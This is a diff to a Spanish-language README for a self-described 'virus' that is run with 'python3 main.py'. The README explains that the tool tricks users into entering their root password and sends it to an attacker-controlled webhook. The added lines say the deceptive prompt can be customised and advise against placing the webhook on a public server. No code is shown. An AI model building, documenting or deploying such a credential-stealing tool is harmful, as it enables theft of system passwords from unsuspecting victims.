@@ -42,6 +42,7 @@
 
 <div align="center" id="install">
      <h3>Instalación del software</h3>
+     <br>
      <p align="justify">
 Para instalar el susware, es muy sencillo. <br>
 <br>
@@ -66,6 +67,13 @@ python3 main.py
 ```
 
 Una vez <b>hecho esto</b>, el virus te va a pedir tu contraseña root, este es una especie de "engaño" <br>
-para poder mandar tu contraseña por medio del webhook
+para poder mandar tu contraseña por medio del webhook, en esta seccion, puedes poner lo que quieras, <br>
+de igual manera, el webhook está controlado por tí
+<br>
+<br>
+Recuerda no integrar el webhook en un server público, porque el webhook, trae la siguiente información consigo <br>
+
+![webhooInfo](https://media.discordapp.net/attachments/845471921990008835/853686103516250152/embed.png)
+
      </p>
 </div>
